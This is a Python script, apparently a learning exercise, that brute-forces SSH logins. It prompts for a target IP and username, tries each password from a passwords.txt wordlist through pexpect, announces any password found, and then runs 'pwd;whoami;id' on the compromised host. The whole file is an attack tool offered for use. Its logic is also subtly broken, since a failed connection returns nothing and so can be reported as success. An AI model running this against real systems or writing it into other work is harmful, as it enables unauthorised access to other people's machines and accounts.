#!/usr/bin/python3

import pexpect
from termcolor import colored


# list of bash prompts to look for
PROMPT = ['# ', '>>> ', '> ', '\$ ', '~$ ']


def send_command(child, command):
    child.sendline(command)
    child.expect(PROMPT)
    print(colored(child.before, "blue"))

# connect to target
def connect(host, user, password):
    ssh_newkey = 'Are you sure you want to continue connecting'
    conn_str = 'ssh {}@{}'.format(user, host)
    child = pexpect.spawn(conn_str)
    ret = child.expect([pexpect.TIMEOUT, ssh_newkey, '[P|p]assword: '])
    
    # if ret is false
    if ret == 0:
        print('[-] Error Connecting')
        return
    # if ret is true
    if ret == 1:
        child.sendline('yes')
        ret = child.expect([pexpect.TIMEOUT, '[P|p]assword: '])
        if ret == 0:
            print('[-] Error Connecting')
            return
    
    child.sendline(password)
    child.expect(PROMPT, timeout=0.5)
    return child


def main():
    # collect target and ssh info
    host = input('Enter the target host\'s IP address: ')
    user = input('Enter SSH username: ')
    file = open('passwords.txt', 'r')
    for password in file.readlines():
        password = password.strip('\n')
        try:
            child  = connect(host, user, password)
            print(colored('[+] Password found: {}'.format(password), "green"))
            send_command(child, 'pwd;whoami;id')
        except:
            print(colored('[-] Wrong Password: {}'.format(password), "red"))


main()
